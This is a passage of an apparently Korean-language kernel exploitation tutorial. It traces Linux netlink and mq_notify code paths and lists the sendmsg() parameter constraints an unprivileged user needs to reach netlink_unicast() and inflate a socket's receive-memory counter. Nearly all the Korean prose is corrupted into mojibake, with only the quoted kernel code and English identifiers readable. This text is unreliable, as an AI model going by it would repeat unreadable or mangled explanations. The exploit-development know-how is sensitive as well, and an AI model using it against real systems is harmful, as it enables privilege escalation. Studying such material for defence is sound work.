    int sock_setsockopt(struct socket *sock, int level, int optname,
            char __user *optval, unsigned int optlen)
    {
      struct sock *sk = sock->sk;
      int val;

      // ... cut  ...

      case SO_RCVBUF:
[0]     if (val > sysctl_rmem_max)
          val = sysctl_rmem_max;
    set_rcvbuf:
        sk->sk_userlocks |= SOCK_RCVBUF_LOCK;
[1]     if ((val * 2) < SOCK_MIN_RCVBUF)
          sk->sk_rcvbuf = SOCK_MIN_RCVBUF;          
        else  
          sk->sk_rcvbuf = val * 2;                 
        break;

      // ... cut (other options handling) ...
    }
```

ì´ëŸ° ì¢…ë¥˜ì˜ ì½”ë“œë¥¼ ë³´ë©´ **ëª¨ë“  ì‹ì˜ íƒ€ì…(expression type)ì„ ìœ ì‹¬íˆ ë´ì•¼ í•œë‹¤**.

**ë…¸íŠ¸**: "signed/unsigned íƒ€ì… í˜¼í•©"ë•Œë¬¸ì— ë§ì€ ë²„ê·¸ê°€ ì¡´ì¬í•œë‹¤. í° íƒ€ì…(u64)ë¥¼ ì‘ì€ íƒ€ì…(u32)ë¡œ ë³€í™˜í•  ë•Œë„ ë§ˆì°¬ê°€ì§€ë‹¤. ì´ ê²½ìš° ì¢…ì¢… *int overflow* ë‚˜ *í˜• ë³€í™˜* ë¬¸ì œë¡œ ì´ì–´ì§„ë‹¤.

ìš°ë¦¬ì˜ íƒ€ê²Ÿ(ì œì‹œëœ íƒ€ê²Ÿê³¼ëŠ” ë‹¤ë¥¼ ìˆ˜ ìˆìŒ)ì—” ë‹¤ìŒê³¼ ê°™ì€ ì‹ íƒ€ì…ì´ ìˆë‹¤:

* **sk\_rcvbuf**: int
* **val**: int
* **sysctl\_rmem\_max**: \_\_u32
* **SOCK\_MIN\_RCVBUF**: "sizeof()" ë•Œë¬¸ì— size\_të¡œ "promote"ë¨

SOCK\_MIN\_RCVBUFëŠ” ë‹¤ìŒì²˜ëŸ¼ defineëœë‹¤:

```c
#define SOCK_MIN_RCVBUF (2048 + sizeof(struct sk_buff))
```

ì¼ë°˜ì ìœ¼ë¡œ *singed* integerì™€ *unsigned* integerë¥¼ í˜¼í•©í•˜ë©´ *singed* integerê°€ unsigned íƒ€ì…ìœ¼ë¡œ ë³€í™˜ëœë‹¤.

**ì£¼ì˜**: ì´ ê·œì¹™ì´ í•­ìƒ ì„±ë¦½í•œë‹¤ê³¤ ìƒê°í•˜ì§€ ë§ì. ì»´íŒŒì¼ëŸ¬ê°€ ë‹¤ë¥¸ ë°©ì‹ì„ ì‚¬ìš©í•  ìˆ˜ë„ ìˆë‹¤. í™•ì‹¤í•˜ê²Œ í•˜ë ¤ë©´ ë””ìŠ¤ì–´ì…ˆë¸”ë¦¬ ì½”ë“œë¥¼ í™•ì¸í•´ë´ì•¼ í•œë‹¤.

"val"ì— *ìŒ*ì˜ ê°’ì„ ì¤¬ë‹¤ê³  ìƒê°í•´ë³´ì. [0]ì—ì„œ (**sysctl\_rmem\_max**ì˜ íƒ€ì…ì´ "\_\_u32"ì´ë¯€ë¡œ) valì€ unsigned íƒ€ì…ìœ¼ë¡œ promoteëœë‹¤. ê·¸ë¦¬ê³  ê°’ì´ *sysctl\_rmem\_max*ë¡œ ì¬ì„¤ì •ë  ê²ƒì´ë‹¤(ì‘ì€ ìŒì˜ ê°’ì€ í° unsigned ê°’ì´ë‹¤).

"val"ì´ "\_\_u32"ë¡œ promoteë˜ì§€ ì•Šë”ë¼ë„ ë‘ ë²ˆì§¸ ê²€ì‚¬ [1]ëŠ” í†µê³¼í•˜ì§€ ëª» í•  ê²ƒì´ê³ , ê²°êµ­ [SOCK\_MIN\_RCVBUF, sysctl\_rmem\_max] (= ìŒìˆ˜ê°€ ì•„ë‹˜)ì— ê³ ì •ë  ê²ƒì´ë‹¤. ì¦‰ **sk\_rcvbuf** í•„ë“œ ëŒ€ì‹  **sk\_rmem\_alloc** í•„ë“œë¥¼ ì´ìš©í•´ì•¼ í•œë‹¤.

**ë…¸íŠ¸**: ìµìŠ¤í”Œë¡œì‡ì„ ê°œë°œí•  ë•Œ ì‹¤ì œë¡œ *ì•„ë¬´ ë°ë„* ê°€ì§€ ì•ŠëŠ” ë§ì€ ì½”ë“œ ê²½ë¡œë¥¼ ë¶„ì„í•˜ê²Œ ëœë‹¤. ì´ ë¬¸ì„œì—ì„œ ê·¸ëŸ° í˜„ìƒì„ ë³´ì—¬ì£¼ê³  ì‹¶ì—ˆë‹¤.

## Back to the "normal" path

ì´ ì‹œë¦¬ì¦ˆì˜ ê·¹ì´ˆë°˜ë¶€ì— ë¬´ì‹œí•˜ê³  ì§€ë‚˜ê°”ë˜ mq\_notifyì˜ "ì •ìƒ" ê²½ë¡œì— ëŒ€í•´ ë‹¤ì‹œ ë‹¤ë£° ë•Œê°€ ë˜ì—ˆë‹¤. ê°œë…ìƒìœ¼ë¡œ, **ì •ìƒ ê²½ë¡œê°€ receive bufferë¥¼ ì‹¤ì œë¡œ ì±„ìš¸ ê²ƒ**ì´ê¸° ë•Œë¬¸ì— receive bufferê°€ ê°€ë“ ì°° ë•Œ ì§„ì…í•˜ëŠ” "retry ê²½ë¡œ"ê°€ ì¡´ì¬í•˜ëŠ” ê²ƒì´ë‹¤.

netlink\_attachskb()ë¥¼ ë³´ë©´ ë‹¤ìŒê³¼ ê°™ë‹¤:

```c
    int netlink_attachskb(struct sock *sk, struct sk_buff *skb,
              long *timeo, struct sock *ssk)
    {
      struct netlink_sock *nlk;
      nlk = nlk_sk(sk);
      if (atomic_read(&sk->sk_rmem_alloc) > sk->sk_rcvbuf || test_bit(0, &nlk->state)) {
          // ... cut (retry path) ...
      }
      skb_set_owner_r(skb, sk);       // <----- what about this ?
      return 0;
    }
```

ì¦‰ *normal path* ëŠ” **skb\_set\_owner\_r()**ì„ í˜¸ì¶œí•œë‹¤:

```c
    static inline void skb_set_owner_r(struct sk_buff *skb, struct sock *sk)
    {
      WARN_ON(skb->destructor);
      __skb_orphan(skb);
      skb->sk = sk;
      skb->destructor = sock_rfree;
[0]   atomic_add(skb->truesize, &sk->sk_rmem_alloc);  // sk->sk_rmem_alloc += skb->truesize
      sk_mem_charge(sk, skb->truesize);
    }
```

**skb\_set\_owner\_r()ì´ *skb->truesize*ë¥¼ í†µí•´ *sk\_rmem\_alloc* ê°’ì„ ì¦ê°€ì‹œí‚¨ë‹¤**. ê·¸ëŸ¼ receive bufferê°€ ê½‰ ì°° ë•Œê¹Œì§€ mq\_notify()ë¥¼ ê³„ì† í˜¸ì¶œí•´ì•¼ í• ê¹Œ? ì•ˆíƒ€ê¹ê²Œë„ ê·¸ê²Œ ê·¸ë¦¬ ì‰¬ìš´ ì¼ì´ ì•„ë‹ˆë‹¤.

mq\_notify()ì˜ ì •ìƒì ì¸ íë¦„ ì´ˆë°˜ì— ("cookie"ë¼ ë¶ˆë¦¬ëŠ”) skbê°€ ìƒì„±ë˜ê³  netlink\_attachskb()ë¥¼ í†µí•´ netlink\_sockì— ì²¨ë¶€(attach)ëœë‹¤. ì´ ë‚´ìš©ì€ ì´ë¯¸ ë‹¤ë¤˜ë‹¤. ê·¸ëŸ¬ê³  ë‚˜ì„œ netlink\_sockê³¼ skbëŠ” message queueì— ì†í•œ "mqueue\_inode\_info"ì— ì—°ë™(associate)ëœë‹¤(mq\_notifyì˜ ì •ìƒ ê²½ë¡œ ì°¸ê³ ). 

**ë¬¸ì œëŠ” mqueue\_inode\_info êµ¬ì¡°ì²´ì— ì—°ë™ë  ìˆ˜ ìˆëŠ” (cookie) "skb" ë™ì‹œì— í•˜ë‚˜ë¿ì´ë¼ëŠ” ê²ƒì´ë‹¤**. ì¦‰ mq\_notify()ë¥¼ ë‘ ë²ˆ í˜¸ì¶œí•˜ë©´ "-EBUSY" ì—ëŸ¬ì™€ í•¨ê»˜ ì‹¤íŒ¨í•˜ê²Œ ëœë‹¤. ë‹¤ì‹œ ë§í•´ **sk\_rmem\_alloc**ì˜ í¬ê¸°ë¥¼ (ì£¼ì–´ì§„ message queueì— ëŒ€í•´) í•œ ë²ˆë°–ì— ì¦ê°€ì‹œí‚¬ ìˆ˜ ì—†ê³  ì´ëŠ” sk\_rcvbufë³´ë‹¤ ì»¤ì§€ê¸°ì— ì¶©ë¶„í•˜ì§€ ì•Šë‹¤.

ì–´ì©Œë©´ ì—¬ëŸ¬ message queueë¥¼ ë§Œë“¤ì–´ ì—¬ëŸ¬ mqueue\_inode\_info ì˜¤ë¸Œì íŠ¸ë¥¼ ë§Œë“¤ê³  mq\_notify()ë¥¼ ì—¬ëŸ¬ ë²ˆ í˜¸ì¶œí•  ìˆ˜ë„ ìˆë‹¤. ì•„ë‹ˆë©´ mq\_timedsend() syscallì„ ì´ìš©í•˜ì—¬ queueì— messageë“¤ì„ ë„£ì„ ìˆ˜ë„ ìˆë‹¤. í•˜ì§€ë§Œ ë‹¤ë¥¸ í•˜ìœ„ ì‹œìŠ¤í…œ(mqueue)ë¥¼ ê³µë¶€í•´ì•¼ í•˜ê³ , "ì¼ë°˜ì ì¸" ì»¤ë„ ê²½ë¡œ(sendmsg)ë¥¼ ì´ìš©í•˜ê¸° ìœ„í•´ì„œ ì´ ë°©ë²•ë“¤ì„ ì‹œë„í•˜ì§„ ì•Šì„ ê²ƒì´ë‹¤. í•´ë³´ë©´ ì¢‹ì€ ì—°ìŠµì´ ëœë‹¤.

**ë…¸íŠ¸**: ìµìŠ¤í”Œë¡œì‡ ì½”ë“œ ì‘ì„±ì—” í•­ìƒ ì—¬ëŸ¬ ë°©ë²•ì´ ìˆë‹¤.

## The netlink\_unicast() path

skb\_set\_owner\_r()ì˜ ë„ì›€ìœ¼ë¡œ netlink\_attachskb()ê°€ sk\_rmem\_alloc ê°’ì„ ì˜¬ë¦´ ìˆ˜ ìˆë‹¤ëŠ” ê²ƒì„ ë³´ì•˜ë‹¤. netlink\_attachskb() í•¨ìˆ˜ëŠ” **netlink\_unicast()**ì— ì˜í•´ í˜¸ì¶œëœë‹¤. ì–´ë–»ê²Œ netlink\_unicast()ì— ë„ë‹¬í•  ìˆ˜ ìˆëŠ”ì§€ í™•ì¸í•˜ê¸° ìœ„í•œ *bottom-up*  ë¶„ì„ì„ í•´ë³´ì:

```plaintext
- skb_set_owner_r
- netlink_attachskb
- netlink_unicast   
- netlink_sendmsg   // there is a lots of "other" callers of netlink_unicast
- sock->ops->sendmsg()          
- __sock_sendmsg_nosec()
- __sock_sendmsg()
- sock_sendmsg()
- __sys_sendmsg()
- SYSCALL_DEFINE3(sendmsg, ...)
```

**netlink\_sendmsg()**ê°€ netlink socketì˜ *proto\_ops*ì´ê¸° ë•Œë¬¸ì— ([í•µì‹¬ ê°œë… #1](https://chamalane.herokuapp.com/posts/5d4ef9fb907a8600042c4cca#core-concepts)), sendmsg() syscallì„ í†µí•´ ë„ë‹¬í•  ìˆ˜ ìˆë‹¤.

sendmsg() syscallì—ì„œ sendmsgì˜ proto\_opsë¡œ ê°€ëŠ¥ genericí•œ ì½”ë“œ ê²½ë¡œëŠ” (sock->ops->sendmsg()) [part 3](https://chamalane.herokuapp.com/posts/5d503601c040080004228197)ì—ì„œ ë” ìì„¸íˆ ë‹¤ë£¬ë‹¤. ë‹¹ì¥ì€ ë³„ ë¬¸ì œ ì—†ì´ netlink\_sendmsg()ì— ë„ë‹¬í•  ìˆ˜ ìˆë‹¤ê³  ê°€ì •í•˜ì.

## Reaching netlink\_unicast() from netlink\_sendmsg()

sendmsg() syscallì€ ë‹¤ìŒê³¼ ê°™ì€  ì„œëª…(signature)ì„ ê°€ì§€ê³  ìˆë‹¤:

```c
ssize_t sendmsg(int sockfd, const struct msghdr *msg, int flags);
```

netlink\_unicast()ì— ë„ë‹¬í•˜ëŠ” ê±´ *msg*ì™€ *flags* ë‘˜ ë‹¤ì˜ *right values*ì™€ ê´€ë ¨ì´ ìˆë‹¤:

```c
  struct msghdr {
     void         *msg_name;       /* optional address */
     socklen_t     msg_namelen;    /* size of address */
     struct iovec *msg_iov;        /* scatter/gather array */
     size_t        msg_iovlen;     /* # elements in msg_iov */
     void         *msg_control;    /* ancillary data, see below */
     size_t        msg_controllen; /* ancillary data buffer len */
     int           msg_flags;      /* flags on received message */
  };

  struct iovec
  {
    void __user     *iov_base;
    __kernel_size_t iov_len;
  };
```

ì´ ì„¹ì…˜ì—ì„  **ì½”ë“œë¡œë¶€í„° íŒŒë¼ë¯¸í„°ì˜ ê°’ì„ ì¶”ë¡ í•˜ê³  ìš°ë¦¬ì˜ "ì œì•½" ëª©ë¡ì„ ë‹¨ê³„ë³„ë¡œ ì„¤ì •í•  ê²ƒì´ë‹¤**. ê·¸ë ‡ê²Œ í•˜ë©´ ì»¤ë„ì´ *ìš°ë¦¬*ê°€ ì›í•˜ëŠ” ê²½ë¡œë¡œ ê°€ê²Œ ëœë‹¤. ì—¬ê¸°ì„œ netlink\_unicast() í˜¸ì¶œì€ í•¨ìˆ˜ì˜ ì œì¼ ëë¶€ë¶„ì— ìˆë‹¤. ëª¨ë“  ê²€ì‚¬ë¥¼ í†µê³¼(í•˜ê±°ë‚˜ ìŠ¤í‚µ)í•´ì•¼ í•  ê²ƒì´ë‹¤.

ì‹œì‘í•´ë³´ì:

```c
    static int netlink_sendmsg(struct kiocb *kiocb, struct socket *sock,
             struct msghdr *msg, size_t len)
    {
      struct sock_iocb *siocb = kiocb_to_siocb(kiocb);
      struct sock *sk = sock->sk;
      struct netlink_sock *nlk = nlk_sk(sk);
      struct sockaddr_nl *addr = msg->msg_name;
      u32 dst_pid;
      u32 dst_group;
      struct sk_buff *skb;
      int err;
      struct scm_cookie scm;
      u32 netlink_skb_flags = 0;

[0]   if (msg->msg_flags&MSG_OOB)
        return -EOPNOTSUPP;

[1]   if (NULL == siocb->scm)
        siocb->scm = &scm;

      err = scm_send(sock, msg, siocb->scm, true);
[2]   if (err < 0)
        return err;

      // ... cut ...

      err = netlink_unicast(sk, skb, dst_pid, msg->msg_flags&MSG_DONTWAIT);   // <---- our target

    out:
      scm_destroy(siocb->scm);
      return err;
    }
```

*MSG\_OOB* í”Œë˜ê·¸ê°€ ì„¤ì •ë˜ì–´ ìˆìœ¼ë©´ í†µê³¼í•  ìˆ˜ ì—†ë‹¤ [0]. ì—¬ê¸°ì„œ ì²« ë²ˆì§¸ ì œì•½ì´ ë‚˜ì˜¨ë‹¤: **msg->msg\_flags MSG\_OOB ë¹„íŠ¸ê°€ ì„¤ì •ë˜ì–´ ìˆì§€ ì•Šì„ ê²ƒ**

[1]ì—ì„œì˜ ê²€ì‚¬ëŠ” "siocb->scm"ì´ **\_\_sock\_sendmsg\_nosec()**ì—ì„œ NULLë¡œ ì„¤ì •ë˜ê¸° ë•Œë¬¸ì— trueì¼ ê²ƒì´ë‹¤. ìµœì¢…ì ìœ¼ë¡œ *scm\_send()*ê°€ ìŒì˜ ê°’ì„ ë°˜í™˜í•˜ë©´ ì•ˆ ëœë‹¤ [2]. ì½”ë“œëŠ” ë‹¤ìŒê³¼ ê°™ë‹¤:

```c
static __inline__ int scm_send(struct socket *sock, struct msghdr *msg,
                   struct scm_cookie *scm, bool forcecreds)
{
    memset(scm, 0, sizeof(*scm));
    if (forcecreds)
        scm_set_cred(scm, task_tgid(current), current_cred());
    unix_get_peersec_dgram(sock, scm);
    if (msg->msg_controllen <= 0)     // <----- this need to be true...
        return 0;                     // <----- ...so we hit this and skip __scm_send()
    return __scm_send(sock, msg, scm);
}
```

ë‘ ë²ˆì§¸ ì œì•½ì€ **msg->msg\_controllenì´ 0ì´ì–´ì•¼ í•œë‹¤**ëŠ” ê²ƒì´ë‹¤. msg->msg\_controllenì˜ íƒ€ì…ì€ size\_tì´ê³  ìŒì˜ ê°’ì´ ì•„ë‹ˆë‹¤.

netlink\_sendmsg()ì˜ ë‚´ìš©ì„ ì´ì–´ì„œ ë³´ì:

```c
      // ... netlink_sendmsg() continuation ...

[0]   if (msg->msg_namelen) {
        err = -EINVAL;
[1]     if (addr->nl_family != AF_NETLINK)
          goto out;
[2a]    dst_pid = addr->nl_pid;
[2b]    dst_group = ffs(addr->nl_groups);
        err =  -EPERM;
[3]     if ((dst_group || dst_pid) && !netlink_allowed(sock, NL_NONROOT_SEND))
          goto out;
        netlink_skb_flags |= NETLINK_SKB_DST;
      } else {
        dst_pid = nlk->dst_pid;
        dst_group = nlk->dst_group;
      }

      // ... cut ...
```

ì•½ê°„ ê¹Œë‹¤ë¡­ë‹¤. ì´ blockì€ "ì†¡ì‹ ì" ì†Œì¼“ì´ ëª©ì ì§€(ìˆ˜ì‹ ì) ì†Œì¼“ì— ì´ë¯¸ ì—°ê²°ë˜ì–´ ìˆëŠ”ì§€ ì•„ë‹Œì§€ì— ë”°ë¼ ë‹¬ë ¤ìˆë‹¤. ë§Œì•½ ì—°ê²°ë˜ì–´ ìˆìœ¼ë©´ "nlk->dst\_pid"ì™€ "nlk->dst\_group"ì€ ì´ë¯¸ ì„¤ì •ë˜ì–´ ìˆë‹¤. ìˆ˜ì‹ ì ì†Œì¼“ì— ì—°ê²°ë˜ë©´ ì¢‹ì§€ ì•Šì€ ë¶€ì‘ìš©ì´ ë°œìƒí•  ìˆ˜ ìˆì–´ì„œ ì²« ì„ íƒì§€(branch)ë¡œ ê°€ëŠ” ê²ƒì´ ì¢‹ë‹¤. ì¦‰ **msg->msg\_namelenì´ ë¬´ì¡°ê±´ 0ì´ ì•„ë‹ˆì–´ì•¼ í•œë‹¤** [0].

í•¨ìˆ˜ì˜ ì‹œì‘ ë¶€ë¶„ì„ ë‹¤ì‹œ ë³´ë©´ "addr"ì´ ìœ ì €ê°€ ì»¨íŠ¸ë¡¤í•  ìˆ˜ ìˆëŠ” ë˜ ë‹¤ë¥¸ íŒŒë¼ë¯¸í„°(msg->msg\_name)ì¸ ê²ƒì„ ì•Œ ìˆ˜ ìˆë‹¤. [2a]ì™€ [2b]ì˜ ë„ì›€ìœ¼ë¡œ ì„ì˜ì ì¸ "dst\_group"ê³¼ "dst\_pid"ë¥¼ ì„ íƒí•  ìˆ˜ ìˆë‹¤. ì´ ë‘˜ì„ ì œì–´í•˜ë©´ ë‹¤ìŒê³¼ ê°™ì€ ì¼ì„ í•  ìˆ˜ ìˆë‹¤:

1. dst\_group == 0: broadcast messageê°€ ì•„ë‹Œ unicast messageë¥¼ ë³´ë‚¼ ìˆ˜ ìˆë‹¤.
2. dst\_pid != 0: ìˆ˜ì‹ ì ì†Œì¼“(ìœ ì € ì˜ì—­)ì— ì„ íƒì„ ì „ë‹¬í•  ìˆ˜ ìˆë‹¤. 0ì€ "ì»¤ë„ì—ê²Œ ì „ë‹¬"ì„ ì˜ë¯¸í•œë‹¤(ë§¤ë‰´ì–¼ì„ ì½ì–´ë³´ì!).

ì œì•½ ëª©ë¡ì—ì„œ ìš°ë¦¬ê°€ ë³€í™˜í•˜ëŠ” ê²ƒì€ ë‹¤ìŒ ê²ƒë“¤ì´ë‹¤(msg\_nameì€ sockaddr\_nlë¡œ í˜• ë³€í™˜ëœë‹¤):

1. **msg->msg\_name->dst\_groupì´ 0**
2. **msg->msg\_name->dst\_pidê°€ "ëª©ì ì§€" ì†Œì¼“ì˜ nl\_pidì™€ ê°™ìŒ**

ê·¸ëŸ¬ë‚˜ ì´ëŠ” **netlink\_allowed(sock, NL\_NONROOT\_SEND)** [3]ê°€ 0ì„ ë°˜í™˜í•˜ì§€ ì•ŠëŠ” ê²ƒì„ ì˜ë¯¸í•œë‹¤:

```c
static inline int netlink_allowed(const struct socket *sock, unsigned int flag)
{
  return (nl_table[sock->sk->sk_protocol].flags & flag) || capable(CAP_NET_ADMIN));
}
```

unprivileged ì‚¬ìš©ìì—ì„œ ìµìŠ¤í”Œë¡œì‡ì„ í•˜ëŠ” ê´€ê³„ë¡œ CAP\_NET\_ADMINì´ ì—†ë‹¤. "NL\_NONROOT\_SEND" í”Œë˜ê·¸ê°€ ì„¤ì •ëœ ìœ ì¼í•œ "netlink protocol"ì€ *NETLINK\_USERSOCK*ì´ë‹¤(êµì°¨ ì°¸ì¡°(cross-reference)í•˜ë¼). ì¦‰ **"sender" ì†Œì¼“ì´ ë¬´ì¡°ê±´ NETLINK\_USERSOCK í”„ë¡œí† ì½œì„ ê°€ì§€ê³  ìˆì–´ì•¼ í•œë‹¤**.

ì¶”ê°€ë¡œ [1]ì—ì„œ **msg->msg\_name->nl\_familyê°€ AF\_NETLINKì™€ ê°™ì•„ì•¼** í•œë‹¤.

ë‹¤ìŒ ë‚´ìš©ì„ ë³´ì:

```c
[0]   if (!nlk->pid) {
[1]     err = netlink_autobind(sock);
        if (err)
          goto out;
      }
```

ì†Œì¼“ ìƒì„± ì¤‘ì—” ì†Œì¼“ì˜ pidê°€ 0ì´ê¸° ë•Œë¬¸ì—(êµ¬ì¡°ì²´ ì „ì²´ê°€ sk\_alloc()ì— ì˜í•´ 0ì´ ë¨) [0]ì—ì„œì˜ ê²€ì‚¬ëŠ” ì œì–´í•  ìˆ˜ ì—†ë‹¤. ë‚˜ì¤‘ì— ë‹¤ì‹œ ëŒì•„ì˜¬ ê²ƒì´ì§€ë§Œ ì§€ê¸ˆì€ **netlink\_autobind()** [1]ê°€ ìš°ë¦¬ì˜ ì†¡ì‹ ì ì†Œì¼“ì— "ì‚¬ìš© ê°€ëŠ¥í•œ" pidë¥¼ ì°¾ì•„ì¤˜ì„œ ì‹¤íŒ¨í•˜ì§€ ì•ŠëŠ”ë‹¤ê³  ìƒê°í•˜ì. ê·¸ëŸ¬ë‚˜ sendmsg()ë¥¼ ë‘ ë²ˆì§¸ë¡œ í˜¸ì¶œí•  ë• ê²€ì‚¬ê°€ ìƒëµë˜ê³  "nlk->pid"ê°€ ì„¤ì •ë  ê²ƒì´ë‹¤. ë‹¤ìŒ ë‚´ìš©ì„ ë³´ì:

```c
      err = -EMSGSIZE;
[0]   if (len > sk->sk_sndbuf - 32)
        goto out;
      err = -ENOBUFS;
      skb = alloc_skb(len, GFP_KERNEL);
[1]   if (skb == NULL)
        goto out;
```

ì—¬ê¸°ì„œ "lent"ì€ **\_\_sys\_sendmsg()** ë„ì¤‘ì— ê³„ì‚°ëœë‹¤. ì´ëŠ” "ëª¨ë“  iovec lenì˜ í•©"ì´ë‹¤. ê·¸ëŸ¬ë¯€ë¡œ ëª¨ë“  iovecì˜ í•©ì´ sk->sk\_sndbuf ë¹¼ê¸° 32ë³´ë‹¤ ì‘ì•„ì•¼ í•œë‹¤. iovecì„ í•˜ë‚˜ë§Œ ì‚¬ìš©í•˜ì—¬ ê°„ë‹¨í•˜ê²Œ ì²˜ë¦¬í•´ë³´ì. ì¦‰ ë‹¤ìŒê³¼ ê°™ë‹¤:

* **msg->msg\_iovlenì´ 1ê³¼ ê°™ë‹¤** // iovec í•˜ë‚˜
* **msg->msg\_iov->iov\_lenì´ sk->sk\_sndbuf - 32ë³´ë‹¤ ì‘ê±°ë‚˜ ê°™ë‹¤**
* **msg->msg->msg\_iov->iov\_baseê°€ ìœ ì € ì˜ì—­ì—ì„œ ì½ì„ ìˆ˜ ìˆì–´ì•¼ í•œë‹¤** //ê·¸ë ‡ì§€ ì•Šìœ¼ë©´ \_\_sys\_sendmsg()ê°€ ì‹¤íŒ¨í•œë‹¤

ë§ˆì§€ë§‰ ì œì•½ì€ **msg->msg\_iov ë˜í•œ *ìœ ì € ì˜ì—­ì˜* ì½ì„ ìˆ˜ ìˆëŠ” ì£¼ì†Œ**ë¼ëŠ” ê²ƒì„ ë‚˜íƒ€ë‚¸ë‹¤(ë‹¤ì‹œ ë§í•˜ì§€ë§Œ ê·¸ë ‡ì§€ ì•Šìœ¼ë©´ \_\_sys\_sendmsg()ê°€ ì‹¤íŒ¨í•¨).

**ë…¸íŠ¸**: "sk\_sndbuf"ëŠ” "sk\_rcvbuf"ì™€ ë™ì¼í•˜ì§€ë§Œ sending bufferì— ëŒ€í•´ì„œëŠ” ì•„ë‹ˆë‹¤. ìš°ë¦° ì´ ê°’ì„ **sock\_getsockopt()**ì— "SO\_SNDBUF" ì˜µì…˜ìœ¼ë¡œ ì–»ì„ ìˆ˜ ìˆë‹¤.

[1]ì—ì„œì˜ ê²€ì‚¬ëŠ” ì‹¤íŒ¨í•˜ë©´ ì•ˆ ëœë‹¤. ë§Œì•½ ì‹¤íŒ¨í•œë‹¤ë©´ ì»¤ë„ì´ í˜„ì¬ ë©”ëª¨ë¦¬ê°€ ë¶€ì¡±í•˜ì—¬ ìµìŠ¤í”Œë¡œì‡ì„ í•˜ê¸° ì¢‹ì€ ìƒíƒœê°€ ì•„ë‹ˆë¼ëŠ” ê²ƒì´ë‹¤. ê·¸ëŸ¼ ìµìŠ¤í”Œë¡œì‡ì„ ì§„í–‰í•  ìˆ˜ ì—†ê³ , ìš´ì´ ë‚˜ì˜ë©´ ì»¤ë„ í¬ë˜ì‹œê°€ ë‚  ê²ƒì´ë‹¤! **ê²½ê³ í–ˆë‹¤. ì—ëŸ¬ ì²˜ë¦¬ ì½”ë“œë¥¼ êµ¬í˜„í•˜ë¼.**

ë‹¤ìŒ ì½”ë“œëŠ” (í†µê³¼í•´ì•¼ í•  ê²€ì‚¬ê°€ ì—†ì–´ì„œ) ë¬´ì‹œí•´ë„ ëœë‹¤. "siocb->scm" êµ¬ì¡°ì²´ê°€ scm\_send()ë¥¼ í†µí•´ ì¼ì° ì´ˆê¸°í™”ëœë‹¤:

```c
      NETLINK_CB(skb).pid   = nlk->pid;
      NETLINK_CB(skb).dst_group = dst_group;
      memcpy(NETLINK_CREDS(skb), &siocb->scm->creds, sizeof(struct ucred));
      NETLINK_CB(skb).flags = netlink_skb_flags;
```

ë‹¤ìŒ ë‚´ìš©ì„ ë³´ì:

```c
      err = -EFAULT;
[0]   if (memcpy_fromiovec(skb_put(skb, len), msg->msg_iov, len)) {
        kfree_skb(skb);
        goto out;
      }
```

ë‹¤ì‹œ, *ì½ì„ ìˆ˜ ìˆëŠ”* iovecì„ ì œê³µí–ˆë‹¤ë©´ [0]ì˜ ê²€ì‚¬ì—ì„  ë¬¸ì œê°€ ìƒê¸°ì§€ ì•Šê³ , ê·¸ëŸ¬ì§€ ì•Šì•˜ë‹¤ë©´ \_\_sys\_sendmsg()ê°€ ì‹¤íŒ¨í•œë‹¤ (ì´ì „ì˜ ì œì•½ ì°¸ê³ ).

```c
[0]   err = security_netlink_send(sk, skb);
      if (err) {
        kfree_skb(skb);
        goto out;
      }
```

ì´ê²ƒì€ ë¦¬ëˆ…ìŠ¤ ë³´ì•ˆ ëª¨ë“ˆ(LSM, ì˜ˆë¥¼ ë“¤ë©´ SELinux) ê²€ì‚¬ì´ë‹¤. ì´ ê²€ì‚¬ë¥¼ í†µê³¼í•˜ì§€ ëª»í•˜ë©´ netlink\_unicastì— ë„ë‹¬í•  ë‹¤ë¥¸ ë°©ë²• í˜¹ì€ ë” ì¼ë°˜ì ìœ¼ë¡œ(generally) "sk\_rmem\_alloc"ì„ ì¦ê°€ì‹œí‚¬ ë°©ë²•ì„ ì°¾ì•„ì•¼ í•œë‹¤(íŒíŠ¸: netlink\_dump()ë¥¼ ì‹œë„í•´ë³´ê¸°). ì—¬ê¸°ì„  ê²€ì‚¬ë¥¼ í†µê³¼í–ˆë‹¤ê³  ê°€ì •í•˜ì.

ê·¸ë¦¬ê³  ë§ˆì§€ë§‰ì´ë‹¤:

```c
[0]   if (dst_group) {
        atomic_inc(&skb->users);
        netlink_broadcast(sk, skb, dst_pid, dst_group, GFP_KERNEL);
      }
[1]   err = netlink_unicast(sk, skb, dst_pid, msg->msg_flags&MSG_DONTWAIT);
```

ìš°ë¦¬ëŠ” "dst\_group" ê°’ì„ "msg->msg\_name->dst\_group"ìœ¼ë¡œ ì„ íƒí–ˆì—ˆë‹¤. 0ì´ ë˜ë„ë¡ í•˜ì˜€ìœ¼ë¯€ë¡œ [0]ì˜ ê²€ì‚¬ë¥¼ í†µê³¼í•  ê²ƒì´ê³ ...**ê²°êµ­ netlink\_unicast()ë¥¼ í˜¸ì¶œí•œë‹¤!**

*íœ´...~~ë„ˆë„¨ ì´ëŸ°ê±° í•˜ì§€ ë§ˆë¼...~~ì—¬ê¸°ê¹Œì§€ ì˜¤ë˜ ê±¸ë ¸ë‹¤...*

ì¢‹ë‹¤. ì´ì œ netlink\_sendmsg()ë¡œë¶€í„° netlink\_unicast()ì— ë„ë‹¬í•˜ëŠ” ë° í•„ìš”í•œ ëª¨ë“  ìš”êµ¬ ì¡°ê±´ì„ ìš”ì•½í•´ë³´ì:

* **msg->msg\_flags**ëŠ” *MSG\_OOB* í”Œë˜ê·¸ê°€ ì—†ë‹¤
* **msg->msg\_controllen**ì€ 0ì´ë‹¤
* **msg->msg\_namelen**ì€ 0ì´ ì•„ë‹ˆë‹¤
* **msg->msg\_name0>nl\_family**ê°€ AF\_NETLINKì™€ ê°™ë‹¤
* **msg->msg\_name->nl\_groups**ê°€ 0ì´ë‹¤
* **msg->msg\_name->nl\_pid**ê°€ 0ì´ ì•„ë‹ˆê³  ìˆ˜ì‹ ì ì†Œì¼“ì„ ê°€ë¦¬í‚¤ê³  ìˆë‹¤
* ì†¡ì‹ ì netlink ì†Œì¼“ì´ **NETLINK\_USERSOCK** í”„ë¡œí† ì½œì„ ì‚¬ìš©í•´ì•¼ í•œë‹¤
* **msg->msg\_iovlen**ì´ 1ì´ë‹¤
* **msg->msg\_iov**ê°€ ì½ê¸° ê°€ëŠ¥í•œ ìœ ì € ì˜ì—­ì˜ ì£¼ì†Œì´ë‹¤
* **msg->msg\_iov->iov\_len**ì´ sk\_sndbuf ë¹¼ê¸° 32ë³´ë‹¤ ì‘ê±°ë‚˜ ê°™ë‹¤
